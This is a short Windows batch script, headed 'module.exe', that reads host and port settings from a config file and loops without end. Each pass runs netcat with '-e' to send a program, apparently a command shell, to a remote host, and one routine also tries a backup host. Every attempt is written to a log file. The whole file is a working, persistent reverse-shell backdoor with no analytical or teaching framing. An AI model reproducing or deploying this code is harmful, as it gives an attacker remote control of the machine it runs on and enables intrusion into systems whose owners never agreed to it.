:: module.exe

@echo on
:initilize
call config.bat
call %uniconf%
echo [%time%/%date%] system executed... >>log.dat
if "%backup%"=="true" goto backup
goto normal

:normal
:: normal routine
:loopa
	echo [%time%/%date%] attempting to connect... >>log.dat
	nc %lhost% %lport% -e %prog%
	echo [%time%/%date%] system connection failed... >>log.dat
	ping localhost -n %waitime% >nul
goto loopa

:backup
:: normal + backup routine
:: this routine will actively try to connect to the
:: initial host as well as a backup host
:loopb
	echo [%time%/%date%] attempting to connect... >>log.dat
	nc %lhost% %lport% -e intsh.bat
	echo [%time%/%date%] system connection failed... >>log.dat
	ping localhost -n %waitime% >nul
	echo [%time%/%date%] attempting to connect to backup host... >>log.dat
	nc %bhost% %bport% -e %bacprog%
goto loopb

:eof